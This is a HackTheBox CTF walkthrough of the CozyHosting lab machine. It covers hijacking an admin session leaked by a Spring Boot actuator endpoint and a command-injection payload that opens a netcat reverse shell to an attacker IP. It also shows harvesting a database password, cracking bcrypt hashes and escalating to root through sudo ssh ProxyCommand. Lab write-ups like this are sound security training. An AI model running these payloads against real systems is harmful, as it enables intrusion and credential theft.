# HackTheBox - CozyHosting

I started with the usual portscan.

`nmap -p- -T4 -sV -sC <IP>`

![Screenshot0](./screenshots/0.png)

We can see an open SSH and web server.

We can also see from the nmap output that we have a domain `cozyhosting.htb`.

I entered this domain in the `/etc/hosts` files and looked at the website.

![Screenshot0](./screenshots/1.png)

And there was a login.

![Screenshot2](./screenshots/2.png)

I first tried it with SQL injections and noSQL injections which did not work.

In the meantime, I went through various enumerations and found something interesting using ffuf.

`ffuf -w raft-medium-words.txt -u http://cozyhosting.htb/FUZZ -ic`

![Screenshot3](./screenshots/3.png)

![Screenshot4](./screenshots/4.png)

Now I first read a bit about [Spring Boot Actuators](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators).

We have various endpoints here which we can enumerate.

The topic around __Spring Boot Actuators__ is quite large and there are various gaps and information leaks that can occur with Spring Boot endpoints.

I enumerated the endpoints and got a bit lost by using different techniques to get sensitive information and looking at and trying different exploit techniques.

However, none of this worked.

I had already had the key to success when enumerating the endpoints at the following endpoint `/actuator/sessions`.

![Screenshot5](./screenshots/5.png)

However, the simple solution only occurred to me when I looked at the `/login` request in burp.

![Screenshot6](./screenshots/6.png)

The values from the `/actuator/session` endpoint were session ID's!

So I intercepted a request to the `/admin` panel and entered the current session ID of __kanderson__ into the request in burp.

And I got to see an admin dashboard!

![Screenshot7](./screenshots/7.png)

The second step concerning the web application went much faster.

I tested the __Include Host__ function from the Admin Dashboard and took a closer look in burp.

![Screenshot8](./screenshots/8.png)

![Screenshot9](./screenshots/9.png)

I repeated the whole thing with different inputs, special characters and so on.

The application provided me with helpful error messages.

![Screenshot10](./screenshots/10.png)

OK, `.../bin/bash:...`, `...command not found...`, that sounds pretty much like __Command Injection__

I set the second parameter `username=`, started a netcat listener and quickly found a working RCE-POC:

```
host=localhost&username=kanderson;`busybox${IFS}nc${IFS}<ATTACKER_IP>${IFS}9009${IFS}-e${IFS}/bin/bash`#
```

![Screenshot11](./screenshots/11.png)

And got a reverse shell on my listener as __app__.

![Screenshot12](./screenshots/12.png)

## app -> josh

From here it went quite quickly and smoothly towards the root flag.

I downloaded the `.jar` application to my computer and unpacked it to have a look at the source code.

![Screenshot13](./screenshots/13.png)

I unpacked it and used `grep` to search for passwords in the web application code.

In the file `/BOOT-INF/classes/application.properties` I found a password to the __PostgreSQL__ database.

![Screenshot14](./screenshots/14.png)

I logged into the database.

`psql -h 127.0.0.1 -d cozyhosting -U postgres`

![Screenshot15](./screenshots/15.png)

List Databases: `\l`

![Screenshot16](./screenshots/16.png)

List all tables of current Database: `\dt`

![Screenshot17](./screenshots/17.png)

Get all users from table: `SELECT * FROM users;`

![Screenshot18](./screenshots/18.png)

OK, we see two `bcrypt` hashes which I cracked using __hashcat__.

![Screenshot19](./screenshots/19.png)

With the cracked password I logged into the system as user __josh__ and got the first flag.

![Screenshot20](./screenshots/20.png)

## josh -> root

The privilege escalation to root was done very quickly.

`sudo -l` shows us that as root user we are authorized to execute the binary `/usr/bin/ssh` at will.

A look at [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/) shows us how we can exploit this.

`sudo -u root /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

And the root flag was owned.

![Screenshot21](./screenshots/21.png)
